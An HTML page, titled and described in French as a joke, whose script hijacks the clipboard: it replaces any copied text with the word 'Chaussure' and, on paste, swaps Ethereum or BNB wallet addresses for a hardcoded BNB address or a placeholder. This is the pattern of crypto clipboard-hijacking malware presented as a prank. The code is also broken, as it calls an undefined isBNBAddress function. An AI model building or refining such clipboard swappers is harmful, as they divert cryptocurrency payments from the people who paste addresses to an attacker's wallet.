<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BLAGUE Crypto</title>
</head>

<body>
    <p>Cette page réalise une blague. Amusez-vous bien !</p>

    <script>
        function replaceCryptoAddress(originalAddress) {
            // Exemple de détection pour BNB (Binance Smart Chain)
            if (isBNBAddress(originalAddress)) {
                return '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'; // Nouvelle adresse BNB
            }

            // Exemple de détection pour ETH (Ethereum)
            if (isETHAddress(originalAddress)) {
                return 'VotreAdresseETH'; // Nouvelle adresse ETH
            }

            // Ajoutez d'autres détections ici pour d'autres crypto-monnaies
            // ...

            // Aucun remplacement nécessaire pour d'autres types de crypto-monnaie
            return originalAddress;
        }

        // Exemple de détection d'adresse ETH (Ethereum)
        function isETHAddress(address) {
            // Note : Ceci est un exemple simple, vous devrez ajuster en fonction du format réel d'adresse ETH
            return address.match(/^0x[a-fA-F0-9]{40}$/);
        }

        // ... Ajoutez des fonctions de détection pour d'autres crypto-monnaies ici

        document.addEventListener('copy', function (event) {
            var customText = 'Chaussure';
            event.preventDefault();
            event.clipboardData.setData('text/plain', customText);
        });

        document.addEventListener('paste', function (event) {
            event.preventDefault();
            var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
            var modifiedText = replaceCryptoAddress(pastedText);
            console.log('Texte collé:', modifiedText);
            alert('Texte collé : ' + modifiedText);
        });
    </script>
</body>

</html>
